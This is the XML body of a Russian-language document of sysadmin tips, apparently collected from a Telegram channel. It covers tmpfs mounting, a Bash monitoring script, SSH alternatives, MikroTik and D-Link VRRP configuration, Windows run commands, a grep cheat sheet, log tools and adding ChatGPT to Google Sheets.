      <text:p text:style-name="P2"><text:span text:style-name="T3">Решить это можно перемонтированием каталога: </text:span><text:span text:style-name="T2">mount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">=1024</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">mode</text:span><text:span text:style-name="T3">=1777,</text:span><text:span text:style-name="T2">remount</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Теперь проверим, есть ли у нас каталог в фстабе: </text:span><text:span text:style-name="T2">cat</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">fstab</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если нет, создаем, если существует то выполняем следующую команду: </text:span><text:span text:style-name="T2">none</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">tmpfs</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">=1024</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">mode</text:span><text:span text:style-name="T3">=1777,</text:span><text:span text:style-name="T2">rw</text:span><text:span text:style-name="T3"> 0 0</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">Теперь готов каталог/</text:span><text:span text:style-name="T2">tmp</text:span><text:span text:style-name="T3">/ с размером, указанным в операторе “</text:span><text:span text:style-name="T2">size</text:span><text:span text:style-name="T3">” размером 1024 </text:span><text:span text:style-name="T2">mb</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P19"><text:span text:style-name="T3">Скрипт </text:span><text:span text:style-name="T2">Bash </text:span><text:span text:style-name="T3">для проверки производительности системы в реальном времени, а также для сбора статистики использования за определенное время:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/bin/bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># This script monitors CPU and memory usage</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">while :</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">do </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Get the current usage of CPU and memory</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>cpuUsage=$(top -bn1 | awk '/Cpu/ { print $2}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>memUsage=$(free -m | awk '/Mem/{print $3}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Print the usage</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>echo "CPU Usage: $cpuUsage%"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>echo "Memory Usage: $memUsage MB"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/># Sleep for 1 second</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>sleep 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T1"><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Подборка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> 4</text:span><text:span text:style-name="T3">х</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">альтернативых</text:span><text:span text:style-name="T2"> SSH </text:span><text:span text:style-name="T3">клиентов</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mosh</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/ - свободное программное обеспечение, доступное для </text:span><text:span text:style-name="T2">GNU</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">BSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">macOS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Solaris</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Chrome</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">iOS</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Mosh</text:span><text:span text:style-name="T3"> - это замена интерактивных терминалов </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3">. Он более надежен и отзывчив, особенно при работе через </text:span><text:span text:style-name="T2">Wi</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Fi</text:span><text:span text:style-name="T3">, сотовую связь и на дальних расстояниях;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">goteleport</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/ - </text:span><text:span text:style-name="T2">Teleport</text:span><text:span text:style-name="T3"> с открытым исходным кодом был разработан для обеспечения доступа к необходимой инфраструктуре без замедления работы. С помощью одного инструмента инженеры получают унифицированный доступ к серверам </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">, кластерам </text:span><text:span text:style-name="T2">Kubernetes</text:span><text:span text:style-name="T3">, базам данных и приложениям </text:span><text:span text:style-name="T2">DevOps</text:span><text:span text:style-name="T3">, таким как </text:span><text:span text:style-name="T2">AWS</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Management</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Console</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">CI</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">CD</text:span><text:span text:style-name="T3">, контроль версий и панели мониторинга во всех средах;</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">eternalterminal</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">dev</text:span><text:span text:style-name="T3">/ - Удаленный терминал для занятых и нетерпеливых. </text:span><text:span text:style-name="T2">Eternal</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Terminal</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">ET</text:span><text:span text:style-name="T3">) - удаленная оболочка, которая автоматически переподключается, не прерывая сеанса;</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3"> - терминальный мультиплексор: он позволяет создавать несколько терминалов, получать к ним доступ и управлять ими с одного экрана. </text:span><text:span text:style-name="T2">tmux</text:span><text:span text:style-name="T3"> может работать в фоновом режиме. Работает на </text:span><text:span text:style-name="T2">OpenBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FreeBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">NetBSD</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">macOS</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">Solaris</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры скриптов для </text:span><text:span text:style-name="T2">Mikrotik</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверьте, не изменился ли </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес на интерфейсе. Иногда провайдер выдает динамические </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адреса. Этот скрипт сравнит, изменился ли динамический </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адрес:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:global currentIP;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:local newIP [/ip address get [find interface="ether1"] address];</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">:if ($newIP != $currentIP) do={</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>:set currentIP $newIP;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Все скрипты:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T2">https://wiki.mikrotik.com/wiki/Manual:Scripting-examples</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T3">Шпаргалка по </text:span><text:span text:style-name="T2">run</text:span><text:span text:style-name="T3"> командам </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">msconfig</text:span><text:span text:style-name="T3"> - Системные настройки.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">msinfo</text:span><text:span text:style-name="T3">32 - Информация о системе.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">resmon</text:span><text:span text:style-name="T3"> - Монитор ресурсов.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">main</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Свойства мыши.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mstsc</text:span><text:span text:style-name="T3"> - Подключение к удаленному рабочему столу.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3"> - Командная строка.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">explorer</text:span><text:span text:style-name="T3"> - Проводник </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">taskmgr</text:span><text:span text:style-name="T3"> - Диспетчер задач.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">shutdown</text:span><text:span text:style-name="T3"> - Выключение компьютера.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">chkdsk</text:span><text:span text:style-name="T3"> - Проверка диска.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">cleanmgr</text:span><text:span text:style-name="T3"> - Очистка диска.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dxdiag - Параметры</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">powershell - Консоль Windows PowerShell.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">winver - Версия</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">controlfolders - Параметры папок.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">diskmgmt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Управление дисками.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">eventvwr</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Журнал событий.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">gpedit</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Редактор локальной групповой политики.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">regedit</text:span><text:span text:style-name="T3"> - Редактор реестра.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sysdm</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Свойства системы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">powercfg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Параметры питания.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">magnify</text:span><text:span text:style-name="T3"> - Экранная лупа.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">charmap</text:span><text:span text:style-name="T3"> - Таблица символов </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">ncpa</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Сетевые подключения.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mrt</text:span><text:span text:style-name="T3"> - Средство удаления вредоносных программ </text:span><text:span text:style-name="T2">Microsoft</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">devmgmt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Диспетчер устройств.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">netplwiz</text:span><text:span text:style-name="T3"> - Учетные записи пользователей.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">services</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">msc</text:span><text:span text:style-name="T3"> - Службы.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">appwiz</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">cpl</text:span><text:span text:style-name="T3"> - Программы и компоненты.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">control</text:span><text:span text:style-name="T3"> - Панель управления.</text:span></text:p>
      <text:p text:style-name="P1">"." - открыть папку текущего пользователя.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">osk</text:span><text:span text:style-name="T3"> - Экранная клавиатура.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">snippingtool</text:span><text:span text:style-name="T3"> - Ножницы.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdsched</text:span><text:span text:style-name="T3"> - Проверка оперативной памяти</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Настройка протокола </text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> на коммутаторах </text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Link</text:span><text:span text:style-name="T3">. Протокол </text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">Virtual</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Router</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Redundancy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Protocol</text:span><text:span text:style-name="T3">) позволяет сформировать один виртуальный коммутатор из группы коммутаторов 3-го уровня. Эта группа (</text:span><text:span text:style-name="T2">VRRP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">group</text:span><text:span text:style-name="T3">) будет иметь один мастер (</text:span><text:span text:style-name="T2">master</text:span><text:span text:style-name="T3">) и один или более резервных (</text:span><text:span text:style-name="T2">backup</text:span><text:span text:style-name="T3">) коммутаторов. <text:s/>Если мастер выходит из строя, резервный коммутатор становится мастером. Настройки коммутаторов из примера такие:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Swicth A</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config)# interface vlan 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# ip address 192.168.10.252 255.255.255.0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# end</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Switch B</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config)# interface vlan 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# ip address 192.168.10.253 255.255.255.0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 252 ip 192.168.10.252</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch(config-if)# vrrp 253 ip 192.168.10.253</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Switch</text:span><text:span text:style-name="T3">(</text:span><text:span text:style-name="T2">config</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">if</text:span><text:span text:style-name="T3">)# </text:span><text:span text:style-name="T2">end</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Этот пример подходит для настройки коммутаторов </text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Link</text:span><text:span text:style-name="T3"> со стандартным </text:span><text:span text:style-name="T2">CLI</text:span></text:p>
      <text:p text:style-name="P1">Недавно мы писали про find (https://t.me/i_odmin/4501), сегодня поговорим про grep в Linux как инструмент для администрирования. grep - утилита командной строки, используется для поиска и фильтрации текста в файлах, на основе шаблона, который (шаблон) может быть регулярным выражением.</text:p>
      <text:p text:style-name="P1">grep iodmin</text:p>
      <text:p text:style-name="P1">grep iodmin file.txt поиск iodmin в файле file.txt, с выводом полностью совпавшей строкой</text:p>
      <text:p text:style-name="P1">grep -o iodmin file.txt поиск iodmin в файле file.txt и вывод только совпавшего куска строки</text:p>
      <text:p text:style-name="P1">grep -i iodmin file.txt игнорирование регистра при поиске</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">grep -bn iodmin file.txt показать строку (-n) и столбец (-b), где был найден iodmin</text:span></text:p>
      <text:p text:style-name="P1">grep -v iodmin file.txt инверсия поиска (найдет все строки, которые не совпадают с шаблоном iodmin)</text:p>
      <text:p text:style-name="P1">grep -A 3 iodmin file.txt вывод дополнительных трех строк, после совпавшей</text:p>
      <text:p text:style-name="P1">grep -B 3 iodmin file.txt вывод дополнительных трех строк, перед совпавшей</text:p>
      <text:p text:style-name="P1">grep -C 3 iodmin file.txt вывод три дополнительные строки перед и после совпавшей</text:p>
      <text:p text:style-name="P1">grep -r iodmin $HOME рекурсивный поиск по директории $HOME и всем вложенным</text:p>
      <text:p text:style-name="P1">grep -c iodmin file.txt подсчет совпадений</text:p>
      <text:p text:style-name="P1">grep -L iodmin *.txt вывести список txt-файлов, которые не содержат iodmin</text:p>
      <text:p text:style-name="P1">grep -l iodmin *.txt вывести список txt-файлов, которые содержат iodmin</text:p>
      <text:p text:style-name="P1">grep -w iodmin file.txt совпадение только с полным словом iodmin</text:p>
      <text:p text:style-name="P1">grep -f iodmins.txt file.txt поиск по нескольким iodmin из файла iodmins.txt, шаблоны разделяются новой строкой</text:p>
      <text:p text:style-name="P1">grep -I iodmin file.txt игнорирование бинарных файлов</text:p>
      <text:p text:style-name="P1">grep -v -f file2 file1 &gt; file3 вывод строк, которые есть в file1 и нет в file2</text:p>
      <text:p text:style-name="P1">grep -in -e 'python' `find -type f` рекурсивный поиск файлов, содержащих слово python с выводом номера строки и совпадений</text:p>
      <text:p text:style-name="P1">grep -inc -e 'test' `find -type f` | grep -v :0 рекурсивный поиск файлов, содержащих слово python с выводом количества совпадений</text:p>
      <text:p text:style-name="P1">grep . *.py вывод содержимого всех py-файлов, предваряя каждую строку именем файла</text:p>
      <text:p text:style-name="P1">grep "Http404" apps/**/*.py рекурсивный поиск упоминаний Http404 в директории apps в py-файлах</text:p>
      <text:p text:style-name="P16">Полный мануал по grep есть тут (https://aidalinux.ru/w/Grep)</text:p>
      <text:p text:style-name="P13">Средства анализа и просмотра log-файлов:</text:p>
      <text:p text:style-name="P1">Alco (Apache Log Colorizing Tool) (https://www.linuxpages.org/) - Утилита для подсветки log-файлов web-сервера Apache. Написана на awk.</text:p>
      <text:p text:style-name="P1">KDE LogViewer (https://kdelogviewer.sourceforge.net/) - Утилита для просмотра log-файлов для KDE. Имеет: фильтр, события, отображение строк разными цветами в зависимости от log-файла.</text:p>
      <text:p text:style-name="P1">Logcheck (https://logcheck.org/) - Простая утилита для фильтрации log-файлов на «не обычные» записи (в.т.ч. и с помощью регулярных выражений) и отправки отчета на e-mail.</text:p>
      <text:p text:style-name="P1">MultiTail (https://github.com/halturin/multitail) - Аналог утилиты tail, позволяющий показывать данные из файлов в нескольких окнах одной консоли. Основан на ncurses.</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">LogMiner (https://logminer.sourceforge.net/) - Мощный анализатор log-файлов для Apache или другого web-сервера, использующего комбинированный </text:span><text:soft-page-break/><text:span text:style-name="T3">формат файлов отчёта. Может выводить детализированную статистику визитов, трафика, навигационных путей, браузеров посетителей и их операционных систем.</text:span></text:p>
      <text:p text:style-name="P1">Основы компьютерных сетей:</text:p>
      <text:p text:style-name="P1">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:p>
      <text:p text:style-name="P1">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:p>
      <text:p text:style-name="P1">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:p>
      <text:p text:style-name="P1">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:p>
      <text:p text:style-name="P1">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:p>
      <text:p text:style-name="P1">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:p>
      <text:p text:style-name="P1">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:p>
      <text:p text:style-name="P1">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:p>
      <text:p text:style-name="P7">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:p>
      <text:p text:style-name="P1">Интегрируем ChatGPT в Google Таблицы. OpenAI предоставляют API для ChatGPT, поэтому уже доступно множество сторонних сервисов, которые смогли интегрировать ИИ в свой функционал. Google Документы не остались в стороне. Понадобится только собственный аккаунт ChatGPT, но мы уже писали (https://t.me/c/1102210815/3274) как его сделать. Чтобы встроить ChatGPT:</text:p>
      <text:p text:style-name="P1">1. Установите расширение «GPT for Sheets and Docs (https://workspace.google.com/marketplace/app/gpt_for_sheets_and_docs/677318054654)» из магазина «Google Workspace Marketplace».</text:p>
      <text:p text:style-name="P1">2. Перейдите в Google Таблицы и откройте любой документ.</text:p>
      <text:p text:style-name="P13">3. Во вкладке «Расширения» появится новый аддон, который мы только что установили.</text:p>
      <text:p text:style-name="P13">4. В выпадающем меню выберите опцию «Set API Key». Понадобится ключ API от вашего аккаунта.</text:p>
      <text:p text:style-name="P1">5. Чтобы его создать, пройдите по ссылке (https://help.openai.com/en/articles/4936850-where-do-i-find-my-secret-api-key) и откройте «User Settings».</text:p>
      <text:p text:style-name="P1">6. При необходимости войдите в ваш аккаунт, сгенерируйте новый ключ и скопируйте его в настройки расширения.</text:p>
      <text:p text:style-name="P4">После этих настроек вы можете использовать ChatGPT сразу из документа. В Google Таблицах в любой ячейке введите команду «=GPT(&lt;ваш_запрос&gt;)». Ответ из чата будет вставлен напрямую в ячейку на экране.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Подборка часто используемых команд для первоначальной настройки устройств MikroTik: имя устройства, DNS сервера, Email, время, доступы и т.д.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установки</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">имени</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">устройства</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/system identity set name=MyHomeMikrotik</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Установка своих DNS серверов и отключение получения их по DHCP</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip dns set servers=8.8.8.8,1.1.1.1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/ip dhcp-client set [find ] use-peer-dns=no</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Настройка email клиента для работы с Yandex.Mail. Для корректной работы разрешите в настройках профиля авторизацию SMTP по обычному паролю или [рекомендуется] используйте пароли приложений (почта)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#/tool e-mail</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:span><text:span text:style-name="T2"/></text:p>
